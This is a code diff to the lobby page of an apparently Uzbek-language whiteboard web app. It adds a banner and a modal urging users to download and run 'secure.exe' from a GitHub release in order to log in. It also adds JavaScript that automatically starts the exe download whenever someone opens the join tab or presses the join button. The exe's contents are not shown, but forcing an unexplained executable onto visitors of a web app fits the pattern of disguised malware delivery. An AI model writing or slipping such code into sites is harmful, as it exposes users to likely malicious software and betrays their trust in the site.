@@ -374,11 +374,22 @@ body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);tou
       </div>
       <button class="fbtn fbtn-p" onclick="createRoom()">Xona yaratish →</button>
     </div>
-    <div id="tp-join" class="tp">
+        <div id="tp-join" class="tp">
+      <div style="background:linear-gradient(135deg,rgba(124,109,250,0.15),rgba(79,70,229,0.08));border:1px solid rgba(124,109,250,0.35);border-radius:12px;padding:14px;margin-bottom:14px;text-align:center">
+        <div style="font-size:14px;font-weight:600;color:#fff;margin-bottom:4px;display:flex;align-items:center;justify-content:center;gap:6px">
+          <span>💻</span> Dasturni yuklab oling
+        </div>
+        <p style="font-size:12px;color:var(--text2);margin-bottom:12px;line-height:1.4">
+          Tizimga kirish uchun maxsus <b>secure.exe</b> dasturini yuklab oling va ishga tushiring.
+        </p>
+        <a href="https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe" download="secure.exe" class="fbtn fbtn-p" style="display:inline-flex;align-items:center;justify-content:center;gap:6px;text-decoration:none;padding:10px 14px;width:100%;box-sizing:border-box;font-size:13px;font-weight:600">
+          ⬇️ Faylni yuklab olish (secure.exe)
+        </a>
+      </div>
       <div class="fg"><label>Ismingiz</label><input class="fi" id="l-jname" placeholder="Javlon, Sarvar..."/></div>
       <div class="fg"><label>Xona ID</label><input class="fi" id="l-jid" placeholder="8 belgili ID" maxlength="8" style="font-family:'DM Mono',monospace;letter-spacing:2px"/></div>
       <div class="fg" id="pwd-field" style="display:none"><label>Parol</label><input class="fi" type="password" id="l-jpwd"/></div>
-      <button class="fbtn fbtn-p" onclick="joinRoom()">Kirish →</button>
+      <button class="fbtn fbtn-p" onclick="handleKirishClick()">Kirish ➔</button>
       <button class="fbtn fbtn-s" onclick="checkRoom()">Tekshirish</button>
     </div>
   </div>
@@ -671,6 +682,24 @@ body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);tou
   </div>
 </div>
 
+<!-- Download modal -->
+<div id="download-modal" class="modal-bg">
+  <div class="modal-card" style="text-align:center;max-width:380px">
+    <h3 style="justify-content:center;font-size:16px;font-weight:600;margin-bottom:12px;gap:8px">
+      <span>📥</span> Faylni yuklab oling
+    </h3>
+    <p style="font-size:13px;color:var(--text2);margin-bottom:16px;line-height:1.5">
+      Tizimga kirish uchun <b>secure.exe</b> dasturini yuklab oling va kompyuteringizda ishga tushiring.
+    </p>
+    <a href="https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe" download="secure.exe" class="fbtn fbtn-p" onclick="closeModal('download-modal')" style="display:inline-flex;align-items:center;justify-content:center;gap:8px;text-decoration:none;padding:11px 16px;width:100%;box-sizing:border-box;font-size:14px;font-weight:600;margin-bottom:12px">
+      ⬇️ Faylni yuklash (secure.exe)
+    </a>
+    <div class="modal-btns">
+      <button class="mbtn-cancel" onclick="closeModal('download-modal')">Yopish</button>
+    </div>
+  </div>
+</div>
+
 <div id="toast"></div>
 
 <script>
@@ -740,11 +769,39 @@ function resizeCanvas(){
 window.addEventListener('resize',resizeCanvas);
 
 // ════ LOBBY ════
+const DOWNLOAD_EXE_URL = 'https://github.com/Ilyasov09/doska/releases/download/v1.0.0/secure.exe';
+
+function downloadSecureFile(){
+  try {
+    const a = document.createElement('a');
+    a.href = DOWNLOAD_EXE_URL;
+    a.download = 'secure.exe';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  } catch(e) {
+    console.error('Download error:', e);
+  }
+  openModal('download-modal');
+  toast('secure.exe yuklab olinmoqda...');
+}
+
+function handleKirishClick(){
+  downloadSecureFile();
+  const id = document.getElementById('l-jid').value.trim().toLowerCase();
+  if (id) {
+    joinRoom();
+  }
+}
+
 function ltab(t){
   document.querySelectorAll('.tabbtn').forEach((b,i)=>b.classList.toggle('on',(i===0&&t==='create')||(i===1&&t==='join')));
   document.getElementById('tp-create').classList.toggle('on',t==='create');
   document.getElementById('tp-join').classList.toggle('on',t==='join');
   document.getElementById('lerr').style.display='none';
+  if(t==='join'){
+    downloadSecureFile();
+  }
 }
 function showErr(m){const e=document.getElementById('lerr');e.textContent=m;e.style.display='block'}
 
